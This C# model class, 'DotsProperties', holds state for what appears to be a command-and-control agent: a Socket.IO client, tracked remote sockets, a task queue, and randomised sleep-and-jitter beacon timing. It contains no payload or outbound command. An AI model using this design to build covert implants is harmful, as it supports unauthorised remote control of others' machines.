using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SocketIOClient;

namespace Dots.Models
{
    public class DotsProperties
    {
        private Random rand = new Random();
        public TaskManager TaskManager { get; set; }
        public SocketIO SocketIOClient {  get; set; }
        public CancellationTokenSource ExecuteTasks = new CancellationTokenSource();
        public bool ProcessTasks = true;
        public bool Interactive = false;

        public ConcurrentDictionary<int, Socket> Remotes = new ConcurrentDictionary<int, Socket>();
        public List<Object> Commands = new List<Object>();

        public int sleep = -1;
        public int jitter = -1;
        public int AddRemote(Socket socket)
        {
            int key;
            do
            {
                key = new Random().Next();
            } while (Remotes.ContainsKey(key));

            Remotes.TryAdd(key, socket);
            return key;
        }

        public int GenerateDelay()
        {
            if (sleep < 0)
            {
                sleep = rand.Next(2000, 6001);
            }

            if (jitter < 0)
            {
                jitter = rand.Next(20, 51);
            }

            double jitterAmount = sleep * (jitter / 100.0);
            return sleep + (int)jitterAmount;
        }
    }
}
